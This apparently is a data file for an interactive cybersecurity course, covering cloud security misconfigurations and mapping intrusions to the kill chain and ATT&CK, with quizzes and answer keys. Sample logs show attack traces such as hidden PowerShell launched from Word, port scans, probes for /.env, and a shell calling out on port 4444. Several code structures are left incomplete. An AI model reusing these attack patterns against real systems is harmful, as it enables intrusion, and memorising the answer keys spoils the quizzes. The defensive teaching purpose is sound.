       ['When no rule matches','Denied; a new group’s default outbound rule allows all traffic out'],
       ['Return traffic','Automatic']]}
   ],{intro:'One intent: HTTPS from anywhere, SSH only from Site A’s Teachers VLAN (10.1.20.0/24). The router guards the DMZ web server (172.16.1.10), apart from staff VLANs. <code>0.0.0.0/0</code> means the whole internet.',
     note:'<b>The stateless cousin:</b> a cloud network ACL guards a whole subnet, lowest-numbered rule first, first match wins. Replies need a rule for ports 1024 to 65535, every client’s ephemeral range (<a href="#sophomore/s4">Services and ports</a>; <a href="#junior/j6">Network security design</a>).',
     caption:'<b>Common finding:</b> 22, 3389, or a database port open to 0.0.0.0/0. Reach admin ports by VPN or the provider’s console.',bloom:'Analyze'}),
   SEQ('A safe first deployment',[
     ['Lock the account','MFA on the root or global admin, no daily use and no access keys for it, and a billing alert.','l1'],
     ['Create roles','People sign in through single sign-on with MFA; programs get roles, never stored keys; one job, one set of rights.','l1'],
     ['Build the network','A virtual network with private subnets for data, and rules that open only what each tier needs.','l2'],
     ['Add compute and storage','Patched images, storage private with Block Public Access on, and encryption at rest.','l2'],
     ['Turn on logs and alerts','Audit logs in every region, kept in a separate log account; data events for sensitive buckets; alerts on high-risk calls.','l3'],
     {ask:'Does anything face the internet?',branches:[['Yes','Only the web tier on 443. Review the rules and run a configuration scan first.'],['No','Deploy, and reach admin tools through a VPN or the provider’s console.']]}

   SEQ('An incident in four log events',[
     ['CreateAccessKey','For <code>build-bot</code> at 02:14Z from 203.0.113.45. <b>Alert:</b> a new key for an identity that never makes keys, from an unknown address.','amber'],
     ['StopLogging','The account’s own trail stops at 02:16Z. <b>Alert:</b> always; logging switched off is never routine.','bad'],
     ['PutBucketPolicy','lehua-clinic-forms now allows Principal <code>"*"</code>. <b>Alert:</b> any policy change that makes storage public. Block Public Access was already off for the account and the bucket, so the change took effect.','bad'],
     ['GetObject × 4,812','Downloads from 203.0.113.45, 02:20Z to 02:41Z. <b>Alert:</b> a volume spike from a new address. Seen only if data events were on before the incident.','bad']

   C('Secrets and containers','Analyze',
     P('Keys and passwords leak through code, config files, screenshots, and chat. Public code sites are scanned for keys within minutes of a push, and deleting the file leaves the key in the history. Secrets belong in a secrets manager (AWS Secrets Manager, Azure Key Vault, or Google Secret Manager), scoped to one job and rotated. A leaked key is <b>revoked first and investigated second</b>.'),
     P('A <b>container</b> packages an app with its libraries and runs it as an isolated process on the host’s shared kernel: lighter than a VM, with weaker isolation. Its recipe, the Dockerfile, is short enough to audit line by line.')),
   ANATOMY('Reading a container recipe (Dockerfile)',[
     {name:'Dockerfile',tag:'Hilo Lehua Clinic forms app',tone:'l2',children:[
       {name:'FROM python:3.12-slim@sha256:9f1c…',tag:'base image',tone:'ok',text:'An official image pinned by digest, so nothing changes unseen; a bot proposes the new digest when patches ship, and you rebuild'},
       {name:'RUN apt-get update && apt-get install -y --no-install-recommends libpq5 && rm -rf /var/lib/apt/lists/*',tag:'packages',tone:'l1',text:'Only what the app needs, with fresh package lists, cleaned up after'},
       {name:'COPY app/ /app/',tag:'files',tone:'l1',text:'No .env, keys, or .git copied in; a .dockerignore keeps them out'},
       {name:'ENV DB_PASSWORD=…',tag:'finding',tone:'bad',text:'A secret in ENV or COPY lives in every copy of the image. Inject it at run time from a secrets manager'},
       {name:'USER 10001',tag:'account',tone:'ok',text:'A non-root user ID, which needs no account in the image. With no USER line the app runs as root'},
       {name:'EXPOSE 8000',tag:'port',tone:'l1',text:'One port, the app’s own'}]}
   ],{intro:'Read top to bottom; each line has one check, and one line fails it.',
     facts:{head:['At run time','Why it matters'],rows:[
       ['<span class="mono">--privileged</span>','Drops most isolation: the container acts nearly as root on the host'],
       ['<span class="mono">-v /var/run/docker.sock:…</span>','Hands the container control of Docker, which is root on the host'],
       ['The docker group','Root-equivalent on the host, as in <a href="#sophomore/s3">Debian-family hardening</a>']]},
     bloom:'Analyze'}),
   QUIZ('j10c2','Check yourself',[
     ['A Dockerfile has no USER line. Finding?',['It runs as root; add a USER line','None: root is the safe default','The base image is not pinned','Port 8000 is open to the whole internet'],0,'Root inside a container sits one step from root on the host when other settings slip.',{whys:['A container runs as root until a USER line names another account, so adding one takes the app off root.','Root is the risky default; a non-root user ID is safer.','Pinning is a separate check; the missing USER line is about which account runs the app.','EXPOSE names one port and opens nothing to the internet.'],imp:'core',c:'cloud-iac'}]
   ]),
   PATH('Single sign-on, step by step',[
     {name:'User and device',tag:'Healani, clinic laptop',tone:'l1',note:['Opens the clinic’s scheduling app','Join state decides which directory knows this laptop (<a href="#junior/j1">Windows Server and Active Directory</a>). On an Entra or hybrid joined PC, the Windows sign-in already holds an Entra token, so the app opens without a second password.'],via:'Sent to sign in'},
     {name:'Identity provider',tag:'Microsoft Entra ID',tone:'l3',note:['Checks password and MFA, then Conditional Access rules on the device (Entra or hybrid joined? compliant?) and location','<b>Target:</b> MFA fatigue, a flood of prompts until someone taps Approve'],via:'Issues a signed token'},
     {name:'Signed token',tag:'SAML or OIDC',tone:'amber',note:['Says who she is, for which app, until when','<b>Target:</b> a stolen session token works without the password or MFA'],via:'Presented to the app'},
     {name:'App',tag:'trusts the IdP',tone:'l2',note:['Checks signature, audience, and expiry, then lets her in','<b>Target:</b> a fake app asking for consent to read mail or files']}
   ],{intro:'Sign in once at the identity provider (IdP); each app trusts its signed token.',
     note:'Gains: one place for MFA, and one switch that removes a leaver from every app. Cost: the IdP becomes the prize, so phishing-resistant MFA, number matching on push prompts, and short token lifetimes guard it.',
     bloom:'Analyze'}),
   C('SAML, OIDC, and OAuth','Analyze',
     P('SAML and OIDC prove who you are; <b>OAuth</b> lets an app act for you, with scopes such as Mail.Read. An unapproved app reading mail or files is <b>consent phishing</b>, so audit consents like passwords.')),
   DETAIL('Each standard’s token, typical use, and audit',
   COMPARE('SAML, OIDC, and OAuth',[
     {name:'SAML',tag:'sign-in, older',tone:'l2',rows:[['Answers','Who you are'],['Token','A signed XML assertion'],['Typical use','Workplace apps that sign in through the company IdP'],['Audit','Which apps trust the IdP, and their signing certificates']]},
     {name:'OIDC',tag:'sign-in, built on OAuth',tone:'l3',rows:[['Answers','Who you are'],['Token','A signed ID token'],['Typical use','“Sign in with Microsoft” or Google on web and phone apps'],['Audit','Which apps are registered, and where they send tokens']]},
     {name:'OAuth',tag:'acting for you',tone:'amber',rows:[['Answers','What an app may do for you'],['Token','An access token with scopes, such as Mail.Read'],['Typical use','A calendar app reading your mailbox'],['Audit','Consents and scopes: an unapproved app reading mail or files is consent phishing']]}
   ],{intro:'Three standards ride on one IdP: two prove who you are, and one hands an app permission.',
     bloom:'Analyze'})),
   C('Read the sign-in log','Analyze',
     P('The identity provider logs every sign-in. Kawika, who runs the clinic’s Microsoft 365, filters Entra sign-in logs for keahi in Office 365. Each entry shows time (HST), result, address, location, and device:'),
     TERM('02:01:07  Failure 500121\n  MFA denied; user declined…\n  198.51.100.77 · (outside the US)\n  Device: none\n  (13 more 500121 lines, to 02:13)\n02:14:52  Success: MFA approved\n  198.51.100.77 · (outside the US)\n  Device: none\n02:19:30  Success: existing session\n  198.51.100.77 · (outside the US)\n  Device: none\n08:02:11  Success: MFA approved\n  192.0.2.30 · Hilo, HI, US\n  Device: KAILUA-WS07 · Compliant: Yes\n  Join type: Entra hybrid joined'),
     P('The intruder already knew the password. Phone-call prompts (press # to approve, without number matching) came from outside the US until Keahi approved one at 2 a.m.; the intruder then worked in that session. The intruder’s lines leave device ID and join type blank: a machine outside the clinic’s fleet. The 08:02 line, from Hilo on a hybrid joined, compliant laptop, is Keahi’s real morning.'),
     P('<b>Response:</b> revoke all of Keahi’s sessions and reset the password. Move Keahi to phishing-resistant MFA (a passkey or security key), and add a Conditional Access rule requiring a hybrid joined or compliant device.')),
   SPOT('j10sp','Spot the problems: a bucket, a security group, and a suite','Three excerpts from Hilo Lehua Clinic’s cloud review. Tap every line that opens more than the job needs, then Check.',[
     ['--- bucket policy: lehua-clinic-forms ---',null],
     ['"Effect": "Allow",',null],
     ['"Principal": "*",','Anyone on the internet, signed in or not. Name the one role that reads the forms.'],
     ['"Action": "s3:GetObject",',null,'Reading objects is exactly what the forms reader needs. The problem is who the Principal line names.'],
     ['"Resource": "arn:aws:s3:::lehua-clinic-forms/*"',null],
     ['Block Public Access (account and bucket): Off','Both safety nets, the account’s and the bucket’s, are off, so the policy above takes effect. Turn them back on.'],
     ['--- security group: web-tier, inbound ---',null],
     ['HTTPS   TCP 443    0.0.0.0/0',null,'A public web tier serves HTTPS to everyone, so 443 open to the internet is its job.'],
     ['SSH     TCP 22     0.0.0.0/0','An admin port open to the whole internet. Allow the clinic’s admin subnet only, or use the provider’s console.'],
     ['MySQL   TCP 3306   0.0.0.0/0','The database answers the internet. Allow it from the app tier’s security group only.'],
     ['SSH     TCP 22     192.168.50.0/24',null,'SSH limited to one private admin subnet, 192.168.50.0/24, is the narrow rule the job needs.'],
     ['--- Microsoft 365 admin: sharing, sign-in, and app consent ---',null],
     ['Default link for new shares: Anyone with the link','Every new link opens to whoever holds it. Default to people in the clinic; Google Drive’s admin console has the same switch.'],
     ['MFA: required for every account',null],
     ['Third-party apps: users may consent to any app','Consent phishing works here. Allow only apps an admin has approved.']
   ]),
   ORDER('j10o','Respond to a leaked access key','Kainoa finds a cloud access key in a public code repository. Put the response in order, then Check.',[
     ['Deactivate the key','First: the key works for anyone until it is off, so every later step would chase a moving target. Deleting the file leaves the key alive in the history.'],
     ['Search the audit log for every call the key made','Second: the log shows what the key did, which tells you what to undo in step 3.'],
     ['Undo what the key changed','Third: the log from step 2 lists every key, user, and policy the leaked key touched, so you remove and restore each one with nothing missed.'],
     ['Replace it with a role or a secrets manager, and clean the history','Fourth: with the damage undone, fix the cause. The app still needs access, so it gets a role or the secrets manager in place of a key, and the history loses the old one.'],
     ['Add a pre-commit secret scan and an alert on new keys','Last: the scan guards the new setup from here on, so the next key is caught before any push.']
   ],'Analyze'),
   QUIZ('j10q','Check: cloud security',[
     ['The trail shows <code>PutBucketPolicy</code> opening a bucket, and no <code>GetObject</code> events at all. What can Pua conclude?',['Nobody downloaded any of the files','The policy change must have failed to save','Nothing, unless data events were on','The intruder used the web console'],2,'Missing events prove nothing when that logging was off, so treat the files as possibly exposed.',{whys:['Without data events, downloads leave no trace either way.','The trail records the change, so the policy saved.','GetObject is a data event, recorded only when data events are on, so its absence proves nothing either way.','The trail here names the calls, with no sign of the console.'],imp:'core',c:'cloud-logs'}],
     ['Malia moved from billing to the front desk in March and still opens billing files. Which model is in use, and which weak spot does this show?',['DAC; owners over-share','MAC; a profile in complain mode','RBAC; role creep','ABAC; a missing attribute'],2,'Remove the old role at every move, and review roles on a schedule.',{whys:['DAC lets owners decide, and her rights came from a role.','MAC is a central policy; complain mode belongs to AppArmor.','Her rights came from the billing role, and she kept it after the move, so rights piled up past her new job.','ABAC rules on attributes, and her rights came from a role.'],imp:'core',c:'gov-access-models'}],
     ['A security group allows inbound 443. Does it need an outbound rule for the replies?',['Yes, for ports 1024 to 65535','Only for visitors who use IPv6','No: security groups are stateful','Only during business hours'],2,'Stateful filters remember each connection; only stateless ones need rules for replies.',{whys:['Stateless ACLs need that rule; security groups track connections.','IPv6 changes nothing; the group tracks replies either way.','A security group is stateful: it tracks each connection and lets its replies out with no extra rule.','Rules run around the clock, and the group tracks every connection.'],imp:'core',c:'cloud-iam-storage'}],
     ['An IdP sign-in log for keahi shows 14 denied MFA prompts, then one approval at 02:14. Best reading and response?',['A broken phone; replace it and move on','A normal sign-in at night; no action needed','Password spray; lock every account at the clinic','MFA fatigue; revoke sessions, require a passkey'],3,'The approval after a flood of prompts is when the intruder got in; reset the password too.',{whys:['A broken phone stays silent; 14 denials mean someone else is trying.','Fourteen denials, then one approval at night, is an attack pattern.','A spray hits many accounts once each; this is one account, many prompts.','A flood of denials, then one approval at night, means an intruder wore Keahi down, so revoke every session and require a passkey, which a tired tap cannot approve.'],imp:'core',c:'sec-passwords-mfa'}],
     ['A PaaS app leaks customer records through a debug page left on. Whose job is the fix?',['The provider’s','The customer’s','Nobody’s, since PaaS is managed','The browser maker’s'],1,'On PaaS the provider runs the platform; the code, its settings, and its data stay the customer’s. <a href="#freshman/f11">Review: The web and the cloud in plain words</a>',{whys:['On PaaS the provider runs the platform; app settings are the customer’s.','On PaaS the provider runs the platform, while the code, its settings (debug pages included), and its data stay the customer’s.','Managed covers the platform; the code stays the customer’s.','The browser only shows the page the server left on.'],imp:'core',c:'cloud-shared-responsibility'}],
     ['A cloud network ACL on the web subnet allows inbound TCP 443 and has only the default deny outbound. Visitors’ pages time out. Why?',['The security group overrides the ACL','Port 443 needs a UDP rule as well','Stateless: replies need their own rule','TLS is blocked by the default rules'],2,'A stateful filter would have let the replies out on its own. <a href="#junior/j6">Review: Network security design: firewalls, zones, VPNs, and Wi-Fi</a>',{whys:['Security groups and network ACLs both apply, each in turn.','HTTPS runs over TCP, so UDP plays no part.','A network ACL is stateless: it judges each packet alone, so the replies need their own outbound rule for ports 1024 to 65535.','Naming TLS misses the cause: the default deny drops replies of every kind, because a stateless ACL needs its own outbound rule for them.'],imp:'good',c:'net-firewall-design'}],
     ['Hilo Lehua Clinic syncs its on-premises AD to Microsoft Entra ID through one sync account, which sits in Domain Admins. Best first change?',['Cut it to only the rights the sync needs','Rename the account to hide it','Turn off the sync for good','Give it a longer password and leave it'],0,'Remove it from Domain Admins and keep only the sync rights. Those rights still reach every password hash, so the account and the sync server are Tier 0: guard them like a domain controller. <a href="#freshman/f11">Review: The web and the cloud in plain words</a> <a href="#junior/j1">Review: Windows Server and Active Directory</a>',{whys:['Least privilege: with only the sync rights, a stolen sync account no longer brings Domain Admins with it.','A new name still sits in Domain Admins.','Ending the sync breaks the clinic’s sign-ins; scope the account instead.','A longer password leaves the Domain Admins rights in place.'],imp:'core',c:'win-admin-tiers'}],
     ['In the sign-in log, keahi’s 02:14 approval came with no device ID and no join type, while the 08:02 line shows a hybrid joined, compliant laptop. Which Conditional Access rule would have refused the 02:14 sign-in even after Keahi tapped Approve?',['Require MFA for every sign-in','Require a hybrid joined or compliant device','Require a password change every 90 days','Allow sign-ins to Office 365 only'],1,'MFA proves the person; a device rule also checks the machine. <a href="#junior/j1">Review: Windows Server and Active Directory</a>',{whys:['The tap already met MFA, so this rule lets it through.','The intruder’s machine was joined to nothing the clinic knows, so a device rule refuses it even after the tap, while Keahi’s own laptop passes.','Password age does nothing against an approved session.','The intruder signed in to Office 365 itself.'],imp:'good',c:'win-device-join'}],
     ['A scan of the clinic’s IaaS VM finds an unpatched Linux kernel. Who patches it?',['The provider, which runs the host','Nobody: cloud VMs patch themselves overnight','The hypervisor, automatically','The clinic, which owns the guest OS'],3,'On IaaS, everything from the guest operating system up is the customer’s.',{whys:['The provider runs the host and hypervisor; the guest OS is the clinic’s.','Cloud VMs patch only when their owner sets that up.','The hypervisor runs VMs and leaves their OS to the customer.','On IaaS the provider runs the hardware and hypervisor, and the guest OS, kernel included, is the clinic’s to patch.'],imp:'core',c:'cloud-shared-responsibility'}],
     ['An ESXi host’s web interface answers on the guest Wi-Fi. Why is that a top finding?',['ESXi has no passwords to protect it','Control of it means control of every VM','Guests might slow the host’s network','ESXi needs the internet to run its VMs'],1,'Whoever controls the hypervisor controls every VM on it, so move its management to an isolated network. <a href="#freshman/f4">Review: Computers, virtualization, and the network</a>',{whys:['ESXi has passwords; reaching its console is the risk.','The hypervisor runs every VM on the host, so whoever reaches its console can stop, copy, or change any of them.','Speed is minor next to control of every VM.','VMs run without the internet; exposure is the risk.'],imp:'core',c:'comp-virtualization'}]
   ]),
   LINKS('Go further',['aws-iam-bp','docker-bp','cis'])
   ]},
 {id:'j11',title:'Map the attack: kill chain, ATT&CK, and threat intelligence',bloom:'Analyze',sum:'Place real-looking evidence on the kill chain and ATT&amp;CK, tell passive from active reconnaissance, rank indicators by how hard they are to change, share intelligence by its label, and recognize attack tools by their traces.',

  blocks:[
   C('Three lenses on one intrusion','Analyze',

     {name:'1. Reconnaissance',tag:'Mon 07:02',tone:'l1',note:['Evidence: one outside address touches nine ports in two seconds.','Breaks it: expose only what the brief needs (<a href="#sophomore/s4">Services and ports</a>).']},
     {name:'2. Weaponization',tag:'Out of view',tone:'l1',note:['Evidence: none on your network; a threat report may name the lure.','Breaks it: load intelligence indicators.']},
     {name:'3. Delivery',tag:'Mon 08:15',tone:'l2',note:['Evidence: 14 copies of “Invoice overdue” from hoku&#8209;hardwre.example, registered three days earlier.','Breaks it: look-alike checks and the report button (<a href="#sophomore/s9">Check before you trust</a>).']},
     {name:'4. Exploitation',tag:'Mon 08:31',tone:'l2',note:['Evidence: Sysmon 1, WINWORD.EXE starts powershell.exe.','Breaks it: block macros in internet files (<a href="#junior/j8">The event trail</a>).']},
     {name:'5. Installation',tag:'Mon 08:32',tone:'l3',note:['Evidence: 4698, a task “OneDriveSync” that runs a file from C:\\Users\\Public.','Breaks it: hunt new tasks, services, and Run keys (<a href="#junior/j8">The event trail</a>).']},
     {name:'6. Command and control',tag:'Mon night',tone:'l3',note:['Evidence: 300 bytes to 203.0.113.60:443 every 60 seconds.','Breaks it: egress rules and DNS filtering (<a href="#junior/j6">Network security design</a>).']},
     {name:'7. Actions on objectives',tag:'Wed 02:10',tone:'bad',note:['Evidence: 2,300 share files renamed .locked in four minutes.','Breaks it: least privilege, offline backups, and fast containment (<a href="#junior/j12">Respond to an incident</a>).']}
   ],{bloom:'Analyze',note:'Steps 1 and 2 happen mostly out of view, so most alerts fire from step 3 on. An alert at step 5 beats one at step 7 by almost two days.',

   ANATOMY('The diamond model',[

   MATCH('j11m','Evidence to kill-chain step and ATT&CK tactic','Tap a piece of evidence from the Hōkū Hardware case, then the step and tactic it shows.',[
     ['Firewall: one outside address hits nine ports in two seconds','Reconnaissance · Reconnaissance (T1595 Active Scanning)','Probing many ports from one address gathers information before an attack, so it is reconnaissance by active scanning.'],
     ['Mail log: “Invoice overdue” from hoku-hardwre.example to 14 staff','Delivery · Initial Access (T1566 Phishing)','The email carries the bait to the victims, which is delivery, and phishing is its way in.'],
     ['Sysmon 1: WINWORD.EXE starts powershell.exe -nop -w hidden … (truncated)','Exploitation · Execution (T1059.001 PowerShell)','The document made code run; ATT&CK names that goal Execution.'],
     ['Event 4698: task “OneDriveSync” runs C:\\Users\\Public\\sync.exe every logon','Installation · Persistence (T1053.005 Scheduled Task)','A task that runs at every logon keeps the intruder’s program coming back, so it is installation for persistence.'],
     ['DNS log: the same PC looks up a random-looking name under sync-cdn.example every 60 seconds','Command and control · Command and Control (T1071 Application Layer Protocol)','Small, regular check-ins are a beacon waiting for orders.'],

   ]),
   SPOT('j11sp','Which lines are reconnaissance?','Hōkū Hardware’s firewall, web, DNS, and mail logs one Monday morning (HST). The scanner at 10.0.9.5 runs an approved weekly scan. Flag every line of unapproved reconnaissance, outside or inside.',[
     ['07:02:11 fw   DENY  203.0.113.77 -> 198.51.100.10 tcp/21,22,23,25,110,135,139,445,3389 (9 ports in 2 s)','One outside address trying nine service ports in two seconds is a port scan: active reconnaissance (T1595). Confirm only 443 answers.'],
     ['07:03:40 web  198.51.100.23 "GET /products/paint.html" 200 "Mozilla/5.0 (Windows NT 10.0)"',null,'One page request from a normal browser, answered with a 200, is a customer shopping.'],
     ['07:04:02 web  203.0.113.77 "GET /.env" 404, "/backup.zip" 404, "/admin/" 404 (212 paths in 30 s)','Hundreds of guessed paths in seconds hunt for hidden files; the 404s show none exist.'],
     ['07:05:15 dns  203.0.113.77 AXFR hoku-hardware.example REFUSED','A zone transfer request asks for every DNS name at once. REFUSED is the right setting.'],
     ['07:10:00 fw   ALLOW 10.0.9.5 -> 10.0.5.0/24 tcp/1-1024 job=weekly-scan',null,'This is the approved weekly scan: it comes from 10.0.9.5 and carries job=weekly-scan, as the intro describes.'],
     ['07:12:48 fw   ALLOW 10.0.5.31 -> 10.0.5.1-254 tcp/445 (254 hosts in 20 s)','An office PC sweeping every address for file sharing is Discovery (T1046): that PC may be compromised, so isolate and investigate it.'],
     ['07:15:09 sec  4625 makana from 10.0.5.20, then 4624 makana at 07:15:21',null,'One failed sign-in and a success 12 seconds later is a typo followed by the right password; reconnaissance shows many names or many tries.'],
     ['07:31:44 mail 203.0.113.77 RCPT keola 250, nohea 550, pua 250 … (60 names in 1 min, no message sent)','Reading the yes or no replies to guessed mailbox names builds a target list (T1589); answer every name alike and rate-limit.']
   ]),
   C('Threat intelligence you can act on','Analyze',
     P('Threat intelligence is evidence that changes a decision. An advisory from CISA, a vendor, or a partner school arrives with <b>indicators</b> (hashes, addresses, and domains) and <b>methods</b> (ATT&amp;CK techniques). Work it in four moves: pull out the indicators, search your logs back to its first-seen date, block or alert on what applies, and report under its sharing label.'),
     HIER('Indicators, easy to change to hard',[
       ['Methods (TTPs)','How the crew works, such as a password spray (<a href="#junior/j8">The event trail</a>) and then a scheduled task. Changing it means retraining people.','l4'],
       ['Tools','A credential dumper or scanner the crew relies on. A Defender 1116 alert that names a known dumper family catches many copies, whatever their hash.','l3'],
       ['Network and host artifacts','A beacon’s timing or user agent, or a Run key named “Updater”.','l2'],
       ['Domain names','hoku&#8209;hardwre.example: a new look-alike costs a few dollars (<a href="#sophomore/s9">Check before you trust</a>).','l1'],
       ['IP addresses','203.0.113.60: rented servers change in minutes.','muted'],
       ['File hashes','One changed byte makes a new hash, and zero detections on a lookup proves nothing.','muted']
     ],{top:'Hard to change',bottom:'Easy to change',caption:'Block the bottom rungs fast, and build detections on the top rungs, because behavior outlasts any one file or server.'}),

            '<b>TLP:AMBER:</b> your own organization and its clients, on a need-to-know basis.',
            '<b>TLP:AMBER+STRICT:</b> your own organization only.',
            '<b>TLP:RED:</b> the named people in the room or on the message, and no one else.')),
   C('Supply-chain attacks: trust you inherit','Analyze',
     P('A supply-chain attack (ATT&amp;CK T1195) poisons something you already trust: an update, a package, a browser extension, or a vendor with access to your network. It often arrives signed by the real vendor, so a valid signature proves only who shipped it. Install only from approved repositories and stores, reject unsigned packages, keep a list of every component you run, and give vendors only the access their job needs.')),
   QUIZ('j11cy3','Check yourself',[
     ['A Debian server’s sources list includes <code>deb http://fastpkgs.example/debian stable main</code>, which nobody approved. Why does it matter?',['It only speeds up updates','A supply-chain risk; remove it','None, since apt checks every package’s signature','It matters only on Ubuntu'],1,'A valid signature proves only who shipped a package, and apt installs it as root. <a href="#junior/j3">Review: Debian and deeper Linux</a>',{whys:['An unapproved source can ship anything, and apt installs it as root.','apt installs, as root, whatever a trusted key signs from any listed source, so an unapproved repository can ship anything, and removing it closes that path.','A valid signature proves only who shipped the package.','Every apt system trusts its sources list the same way.'],imp:'core',c:'lin-packages'}]
   ]),
   C('Attack tools by the traces they leave','Analyze',
     P('Testers and criminals use the same tool families. An <b>exploit framework</b> packages known exploits and payloads so someone can try them quickly; nearly all of its reach comes from flaws that already have patches.'),

       {name:'Scanners',tag:'map the network',tone:'l1',rows:[
         ['Purpose','List live hosts, open ports, and service versions'],
         ['Trace','One source touching many ports or hosts in seconds; IDS scan alerts'],
         ['Blunted by','Fewer exposed services, sweep alerts, and your own approved scans first']]},
       {name:'Password attacks',tag:'guess or crack',tone:'l2',rows:[
         ['Purpose','Guessers try passwords on a live sign-in; crackers test stolen hashes offline'],
         ['Trace','Guessers: bursts of 4625 or failed SSH lines. Crackers: nothing on your network; the trace is the earlier hash theft'],
         ['Blunted by','MFA, lockout alerts, spray alerts, long passphrases, and slow salted hashes']]},
       {name:'Dumpers and poisoners',tag:'steal secrets',tone:'amber',rows:[
         ['Purpose','Read passwords or hashes from memory, or answer name lookups meant for someone else'],
         ['Trace','Sysmon 10: an odd process opens lsass.exe; name answers from a workstation'],
         ['Blunted by','LSA protection and Credential Guard, LLMNR and NBT-NS off, and admins kept off everyday PCs']]},
       {name:'Exploit frameworks',tag:'run code',tone:'bad',rows:[
         ['Purpose','Try packaged exploits, then open a remote shell'],
         ['Trace','A new listener, a server calling out on an odd port such as 4444, or a web process starting a shell'],
         ['Blunted by','Patching known flaws, egress filtering, and alerts on servers that start shells']]}
     ],{bloom:'Analyze',intro:'Recognition only: read across the Trace row to learn each family’s fingerprint.',

     DETAIL('Web proxies in the logs',

   C('Privilege escalation: one audit','Analyze',
     P('<b>Privilege escalation</b> turns limited access into more. <b>Vertical</b> escalation climbs from a user to admin or root; <b>horizontal</b> escalation takes over a peer’s account at the same level. Almost every path is a misconfiguration you already know how to find.'),

           {name:'Flaws ranked too low',note:'The vulnerability loop · <a href="#junior/j5">Evaluate a configuration</a>',tone:'l2'}]}]})),
   QUIZ('j11q','Check: map the attack',[
     ['Over three months at Kona Hillside Roasters, logs show a 3 a.m. sign-in about once a week from a new address and a small upload each night, without a ransom note.<br>Which actor fits, and what should the alert watch?',['An opportunist; block the newest address','A hacktivist; watch the website for defacement','An APT; alert on its behavior','A careless insider; delete the account'],2,'Behavior sits on the top rung: it outlasts any one address or file. <a href="#freshman/f8">Review: Threats and the people behind them</a>',{whys:['Opportunists want quick wins and move on, and this crew came back for three months.','Hacktivists want attention, such as defacements, and this crew stayed quiet.','Slow, quiet, and patient marks an APT, and its addresses keep changing while its methods last, so a behavior alert keeps working.','This pattern is deliberate and repeated, and deleting the account erases evidence.'],imp:'core',c:'threat-actors'}],
     ['A flow record shows KAILUA-WS07 sending about 300 bytes to 203.0.113.60:443 every 60 seconds all night. Which kill-chain step and tactic?',['Command and control; Command and Control','Reconnaissance; Reconnaissance','Delivery; Initial Access','Actions on objectives; Exfiltration'],0,'Small, regular check-ins are a beacon. Theft would show large outbound volumes. <a href="#junior/j7">Review: Read the wire: captures, flows, and network attacks</a>',{whys:['Small check-ins at a steady beat are a beacon, malware asking its server for orders, which is command and control.','Reconnaissance gathers information about a target, while these check-ins come from a PC that is already infected.','Delivery brings the bait in.','Exfiltration shows large outbound volumes, and these are about 300 bytes.'],imp:'core',c:'threat-kill-chain'}],
     ['Your teacher shares a TLP:AMBER advisory from the district security team with the cyber club. May you post it in the class chat?',['Yes, since it is for learning','Yes, after removing the logo','Only when the chat is private','No: AMBER is need-to-know only'],3,'Check the TLP label before you share, and ask the source to widen it.',{whys:['Learning is fine, and AMBER still limits who may see it.','The label stays with the content after the logo comes off.','AMBER means need-to-know inside the organization, and a class chat reaches beyond that.','AMBER limits sharing to people in your organization who need to know, and only the source can widen that.'],imp:'good',c:'threat-intel'}],
     ['A mailbox audit at Waimea Feed and Supply shows a new rule on the owner’s mailbox: forward every message containing “invoice” to an outside free-mail address. Which ATT&CK tactic is this?',['Reconnaissance','Collection','Impact','Discovery'],1,'BEC gathers invoices before redirecting a payment; remove the rule, reset the password, and end every session. <a href="#freshman/f8">Review: Threats and the people behind them</a>',{whys:['Reconnaissance happens before access, and this rule needs access.','A rule that copies invoices to an outside address gathers data quietly, which ATT&amp;CK calls Collection.','Impact disrupts or destroys, and this copies quietly.','Discovery maps the environment.'],imp:'core',c:'threat-kill-chain'}],
     ['A staff member who leaves next week copies the whole customer folder to a USB drive at 9 p.m. Which model fits this case worst?',['The kill chain, since an insider skips its early steps','ATT&CK, which lists only malware','The diamond model, which needs an outside IP address','All three fit equally'],0,'An insider starts with access, so reconnaissance, delivery, and exploitation never happen; ATT&CK and the diamond still fit.',{whys:['The kill chain starts with reconnaissance, delivery, and exploitation, and an insider already holds access, so those steps never happen.','ATT&amp;CK lists behaviors by malware and people alike.','The diamond model works with any infrastructure, inside included.','The kill chain fits poorly when access already exists.'],imp:'good',c:'threat-kill-chain'}],
     ['Last week you blocked a malware file’s hash. Today the same crew is back with a new file. Which detection would have lasted?',['Adding the new file’s hash to the list','Blocking last week’s IP address','An alert on Office apps starting PowerShell','Blocking the look-alike domain'],2,'Detections built on methods, the top rung, outlast any one file.',{whys:['A new hash comes with every new file.','Addresses change in minutes.','Both files used one method, Office starting PowerShell, and methods change far less often than files, addresses, or domains.','Domains are cheap to replace.'],imp:'core',c:'threat-intel'}],
     ['Which tool family leaves no trace on your network while it runs?',['A port scanner','An offline hash cracker','An online password guesser','A remote shell'],1,'Cracking runs on the intruder’s own machine, so look for the earlier hash theft.',{whys:['A scanner touches many ports, which logs see.','An offline cracker works on stolen hashes on the intruder’s own machine, so your network sees only the earlier theft.','Online guessing leaves failed sign-ins.','A remote shell needs a live connection.'],imp:'good',c:'threat-attack-tools'}],
     ['A Hōkū Hardware web server opens an outbound connection to 198.51.100.66:4444, and the web process has a shell as its child. What would have removed that reach?',['Blocking inbound port 4444 at the firewall','A new TLS certificate for the site','Nightly antivirus scans of the web root','Patching the flaw and limiting outbound traffic'],3,'Patching and outbound limits each cut off what an exploit framework can reach.',{whys:['The connection goes out, so an inbound rule misses it.','A certificate covers the site’s identity.','Nightly scans look at files, and this runs live.','Exploit tools mostly use flaws that patches already fix, and the shell needs a way out, so patching and an outbound limit each cut it off.'],imp:'core',c:'threat-attack-tools'}],
     ['keola, a standard user, can edit a root cron script because it is world-writable. What kind of escalation path is this, and what closes it?',['Horizontal; remove keola from sudo','Horizontal; lock keola’s account','Vertical; reboot to reload cron','Vertical; only root may write the script'],3,'Anything writable that runs as admin is a vertical path. <a href="#junior/j3">Review: Debian and deeper Linux</a>',{whys:['Horizontal means a peer account, and this reaches root.','Locking keola leaves the script writable by others.','A reboot reloads the same writable script.','The script runs as root, so keola’s edit runs as root, a vertical climb, and letting only root write the script closes the path.'],imp:'core',c:'host-file-permissions-shares'}]
   ]),
   LINKS('Go further',['mitre-attack','first-tlp','cisa'])
